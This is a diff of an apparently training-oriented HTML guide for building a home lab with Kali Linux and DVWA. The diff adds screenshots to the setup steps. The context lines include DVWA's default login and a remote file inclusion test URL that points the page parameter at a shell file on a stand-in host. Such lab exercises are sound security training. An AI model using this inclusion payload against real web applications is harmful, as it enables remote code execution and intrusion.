@@ -59,7 +59,10 @@
 <li>Start the VM and select the Kali Linux ISO as the startup disk.
  
 <li>Follow the on-screen instructions to complete the installation.
-</li> 
+</li>
+ <br/>
+<img src="https://imgur.com/LSk89Vc.png" height="80%" width="80%" alt="Building Home Network Steps"/>
+<br />
 </ul>
 </li> 
 </ol>
@@ -104,6 +107,10 @@
  
 <li>Ensure network settings are set to Host-only Adapter.
 </li> 
+ <br/>
+<img src="https://imgur.com/luL7HIn.png" height="80%" width="80%" alt="Building Home Network Steps"/>
+<br />
+
 </ul>
 </li> 
 </ol>
@@ -149,6 +156,10 @@
  
 <li>Select DVWA (Damn Vulnerable Web Application)
 </li> 
+ <br/>
+<img src="https://imgur.com/UgS2Mq0.png" height="80%" width="80%" alt="Building Home Network Steps"/>
+<br />
+
 </ul>
 </li> 
 </ol>
@@ -165,6 +176,10 @@
 
 <li>Log In: Default credentials (admin // password).
 </li>
+ <br/>
+<img src="https://imgur.com/RuHXLLS.png" height="80%" width="80%" alt="Building Home Network Steps"/>
+<br />
+
 </ol>
 <p>
 
@@ -182,6 +197,10 @@
 
 <li>Click "Submit" to save changes.
 </li>
+ <br/>
+<img src="https://imgur.com/Hz17ghA.png" height="80%" width="80%" alt="Building Home Network Steps"/>
+<br />
+
 </ol>
 <p>
 
@@ -196,6 +215,10 @@
 
 <li><strong>Select File Inclusion.</strong>
 </li>
+ <br/>
+<img src="https://imgur.com/jHW1AYq.png" height="80%" width="80%" alt="Building Home Network Steps"/>
+<br />
+
 </ul>
 <p>
 
@@ -213,6 +236,10 @@
 
 <li><strong>Test URL: http://192.168.1.250/dvwa/vulnerabilities/fi/?page=http://example.com/shell.txt</strong>
 </li>
+ <br/>
+<img src="https://imgur.com/D0IP5J3.png" height="80%" width="80%" alt="Building Home Network Steps"/>
+<br />
+
 </ol>
 <p>
 
